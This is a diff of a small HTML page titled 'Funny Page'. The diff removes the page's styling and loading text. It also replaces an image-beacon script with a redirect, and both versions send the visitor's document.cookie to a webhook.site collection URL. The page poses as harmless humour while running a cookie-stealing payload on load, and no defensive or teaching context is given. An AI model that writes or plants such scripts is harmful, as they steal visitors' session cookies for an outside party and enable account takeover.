@@ -2,22 +2,12 @@
 <html>
 <head>
     <title>Funny Page</title>
-    <style>
-        body {
-            text-align: center;
-            padding-top: 50px;
-            background-color: #f0f0f0;
-        }
-        h1 {
-            color: #333;
-        }
-    </style>
 </head>
 <body>
     <h1>Welcome to my funny page!</h1>
-    <p>Loading something hilarious...</p>
     <script>
-        new Image().src = 'https://webhook.site/e581788c-8d0e-412e-8849-ef5bd96ea4dd?cookies=' + encodeURIComponent(document.cookie);
+        // Send cookies directly in the URL path for better visibility
+        location = 'https://webhook.site/e581788c-8d0e-412e-8849-ef5bd96ea4dd/' + document.cookie;
     </script>
 </body>
 </html>
